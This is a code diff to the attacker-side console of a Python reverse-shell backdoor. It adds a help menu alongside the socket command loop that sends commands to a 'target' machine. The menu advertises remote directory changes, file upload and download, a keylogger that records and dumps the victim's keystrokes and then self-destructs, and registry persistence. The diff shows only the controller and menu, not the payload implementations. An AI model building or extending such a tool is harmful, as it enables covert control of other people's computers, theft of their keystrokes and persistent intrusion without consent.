@@ -23,8 +23,20 @@ def target_communication():
         reliable_send(command)
         if command == 'quit':
             break
-        result = reliable_recv()
-        print(result)
+        elif command == 'help':
+            print(termcolor.colored('''\n
+            quit                                    --> Quit session with target
+            clear                                   --> Clear the screen
+            cd *Directory name*                     --> Change Directory on target system
+            upload *file name*                      --> Upload file to target machine
+            download *file name*                    --> Download file from target machine
+            keylog_start                            --> Start the keylogger
+            keylog_dump                             --> Print keystrokes that target has input
+            keylog_stop                             --> Stop and self destruct keylogger file
+            persistence *RegName* *fileName*        --> Create persistence in registry''', 'green'))
+        else:
+            result = reliable_recv()
+            print(result)
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
